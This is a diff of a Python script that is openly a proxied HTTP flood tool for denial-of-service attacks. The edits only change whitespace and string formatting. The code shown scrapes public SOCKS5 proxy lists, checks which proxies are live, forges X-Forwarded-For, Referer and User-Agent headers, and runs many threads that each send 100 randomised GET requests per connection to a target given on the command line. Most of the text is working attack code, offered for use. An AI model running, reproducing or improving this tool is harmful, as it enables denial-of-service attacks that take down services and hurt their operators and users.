@@ -7,9 +7,9 @@ import sys
 import socks # pysocks
 import requests # requests
 from fake_useragent import UserAgent # fake-useragent
- 
+
 # Init
- 
+
 targetHost = sys.argv[1]
 targetPort = int(sys.argv[2])
 threadNumber = int(sys.argv[3])
@@ -34,9 +34,9 @@ proxyResources = [
     'https://www.proxy-list.download/api/v1/get?type=socks5',
     'https://www.proxyscan.io/download?type=socks5',
 ]
- 
-connectProxyHeader = "GET / HTTP/1.1\r\nHost: " + targetHost + "\r\n\r\n"
- 
+
+connectProxyHeader = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(targetHost)
+
 def socksCrawler():
     global socksFile, socksResources
     f = open(proxyFile, "wb")
@@ -46,8 +46,8 @@ def socksCrawler():
         except:
             pass
     f.close()
- 
- 
+
+
 def connectProxy(proxy):
     global liveProxies
     proxySplit = proxy.strip().split(":")
@@ -79,7 +79,7 @@ def checkProxies():
     for proxy in proxies:
         f.write(proxy)
     f.close()
- 
+
 def Flood(indexPicker):
     if indexPicker < len(proxies):
         proxy = proxies[indexPicker].strip().split(":")
@@ -92,7 +92,7 @@ def Flood(indexPicker):
     Connection = "Connection: Keep-Alive\r\n"
     Accept = "Accept: */*\r\n"
     Referer = "Referer: https://google.com?q=" + targetHost + "\r\n"
-    X_Forwarded_For = f"X-Forwarded-For: {proxy[0]}, {proxy[0][::-1]}\r\n"
+    X_Forwarded_For = "X-Forwarded-For: {}, {}\r\n".format(proxy[0], proxy[0][::-1])
     User_Agent = "User-Agent: " + userAgent + "\r\n\r\n"
     event.wait()
     while True:
@@ -106,8 +106,8 @@ def Flood(indexPicker):
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
             try:
                 for _ in range(100):
-                    valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
-                    floodHeader = f"GET {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
+                    valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
+                    floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + Referer + X_Forwarded_For + User_Agent
                     s.send(str(floodHeader).encode())
                 s.close()
                 print("Flood sent " + proxy[0] + ":" + proxy[1])
@@ -115,18 +115,18 @@ def Flood(indexPicker):
                 s.close()
         except:
             s.close()
- 
+
 if "--socksCrawler" in sys.argv:
     socksCrawler()
 else:
     pass
- 
+
 if "--useMyFile" in sys.argv:
     proxyFile = input("Your file: ")
     proxies = open(proxyFile).readlines()
 else:
     proxies = open("socks5.txt").readlines()
- 
+
 if "--checkProxies" in sys.argv:
     proxies = open(proxyFile).readlines()
     checkProxies()
@@ -141,5 +141,5 @@ for indexPicker in range(threadNumber):
     thread = threading.Thread(target=Flood, args=(indexPicker, ))
     thread.setDaemon = True
     thread.start()
- 
+
 event.set()
